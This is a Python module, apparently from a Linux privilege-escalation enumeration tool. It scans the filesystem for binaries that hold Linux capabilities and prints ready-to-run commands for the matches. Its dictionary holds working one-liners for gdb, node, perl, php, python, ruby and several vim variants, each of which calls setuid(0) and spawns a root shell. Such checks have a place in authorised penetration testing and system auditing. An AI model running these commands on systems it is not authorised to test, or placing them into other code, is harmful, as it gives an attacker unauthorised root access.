import subprocess
from Scripts.settings import *

progress = Progress()

cap_bin_dict = {'gdb': ["./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"],
                'node': [
                    './node -e \'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''],
                'perl': ['./perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";\''],
                'php': ['./php -r "posix_setuid(0); system(\'/bin/sh\');"'],
                'python': ['./python -c \'import os; os.setuid(0); os.system("/bin/sh")\''],
                'ruby': ['./ruby -e \'Process::Sys.setuid(0); exec "/bin/sh"\''],
                'rview': [
                    './rview -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\''],
                'rvim': [
                    './rvim -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\''],
                'view': [
                    './view -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\''],
                'vim': ['./vim -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\''],
                'vimdiff': [
                    './vimdiff -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'']}


def result_find_capabilities(silence):
    vuln_bin_table = []
    find_cap = "getcap -r / 2>/dev/null"
    result = subprocess.run(find_cap, shell=True, stdout=subprocess.PIPE).stdout.decode().strip().split("\n")
    # cuts the result to only get the directory of the vulnerable binary
    result = [bin_dir.split(" ")[0] for bin_dir in result]
    # add all the possible vulnerable binary into a list based on the cap_bin_dict
    possible_vulnerable_bins = [bin_directory for bin_directory in result if
                                bin_directory.split("/")[-1] in cap_bin_dict.keys()]

    progress.running = False

    # if the len of this new list is greater than zero, than there are vulnerable binaries
    if len(possible_vulnerable_bins) > 0:

        if not silence:
            output(end="\r")
            output(f"{BG_Red}CAPABILITIES VULNERABILITY FOUND:{END}\n"
                   f"This vulnerability can be used to manipulate the current user's own UID to 0 e.g ROOT UID\n")

        for bin_directory in possible_vulnerable_bins:
            bin_name = bin_directory.split("/")[-1]  # extract the binary name from the directory
            command_to_execute = cap_bin_dict[bin_name][0]  # get the command to execute based on the dictionary

            command_to_execute = command_to_execute.replace(f"./{bin_name}", bin_directory)

            if not silence:
                output(f"[+] Vulnerable binary: {RED + bin_name + END}\n"
                       f"The following command may be used to escalate privileges to ROOT.\n"
                       f"{LIGHTGRAY + ITALIC + command_to_execute + END}\n")

            vuln_bin_table.append((bin_directory, command_to_execute,
                                   "This binary can be used to escalate privileges to ROOT by manipulating the current user's own UID to 0"))

    else:
        if not silence:
            output(f"{YELLOW}[-] No vulnerable binary with capabilities granted found.")

    return vuln_bin_table


def find_capabilities(silence):
    progress_thread = CThread(target=lambda: progress.progress_func(silence))
    result_findings_thread = CThread(target=lambda: result_find_capabilities(silence))

    progress_thread.start()
    result_findings_thread.start()

    progress_thread.join()
    return result_findings_thread.join()
